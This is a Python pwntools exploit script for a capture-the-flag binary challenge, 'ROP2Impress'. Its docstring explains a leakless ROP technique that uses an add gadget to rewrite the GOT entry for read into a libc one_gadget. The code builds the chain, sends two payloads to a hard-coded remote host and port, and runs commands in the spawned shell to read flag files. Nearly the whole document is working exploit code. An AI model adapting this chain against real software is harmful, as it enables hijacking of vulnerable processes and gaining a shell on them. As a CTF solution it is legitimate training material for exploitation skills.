#!/usr/bin/env python3
"""
ROP2Impress (CYBERBLITZ 2026, pwn, 352) — no leak, no output.

No RELRO / No canary / NX / No PIE / glibc 2.39. Only `read` is imported, so there is no
output primitive and no libc leak. Instead:

  * `add dword [rbp-0x3d], ebx ; nop ; ret` (0x40110c) is an arbitrary 4-byte add. Point it at
    GOT[read] and add (one_gadget_off - read_off): GOT[read] becomes a one_gadget, libc-relative,
    no leak required.
  * one_gadget 0x583ec = posix_spawn("/bin/sh") needs rax==0, rbx==0, 16-aligned rsp, and a lot
    of stack. Run the chain on the real process stack (not .bss) via rop()'s own recursion:
    frame 2 stops the recursion and unwinds into frame 1, where the chain lives.

Needs the provided main + libc.so.6 next to this script.  nc 45.77.247.35 22004
"""
import sys, time
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

e    = ELF('./main', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

POP_RBX  = 0x40112a
POP_RBP  = 0x40110d
ADD      = 0x40110c          # add dword [rbp-0x3d], ebx ; nop ; ret
MOVEAX0  = 0x401169          # mov eax, 0 ; pop rbp ; ret
RET      = 0x401016
READ_PLT = e.plt['read']
RBP_ADD  = e.got['read'] + 0x3d          # so [rbp-0x3d] == GOT[read] (0x403350)

OG  = 0x583ec                             # posix_spawn("/bin/sh") one_gadget
Dsp = (OG - libc.sym.read) & 0xffffffff   # add this to GOT[read] low dword

HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ('45.77.247.35', 22004)


def main():
    chain  = p64(POP_RBP) + p64(RBP_ADD) + p64(POP_RBX) + p64(Dsp) + p64(ADD)  # GOT[read]+=Dsp
    chain += p64(MOVEAX0) + p64(0)        # rax = 0 (and pop a junk rbp)
    chain += p64(POP_RBX) + p64(0)        # rbx = 0
    chain += p64(RET)                     # 16-byte alignment
    chain += p64(READ_PLT)                # read@plt -> one_gadget

    buf1 = (p64(0) + chain).ljust(0x60, b'\x90')     # buf1[0]==0 -> recurse
    buf2 = b'\x41' * 0x50 + p64(0xdead) + p64(POP_RBP)  # buf2[0]!=0 -> stop; ret = pop rbp ; ret

    io = remote(HOST, PORT)
    io.send(buf1); time.sleep(0.4)
    io.send(buf2); time.sleep(0.6)
    io.sendline(b'id; cat flag* /flag* 2>/dev/null; echo END_MARK')
    time.sleep(1)
    print(io.recvrepeat(3).decode('latin1', 'replace'))
    io.close()


if __name__ == '__main__':
    main()
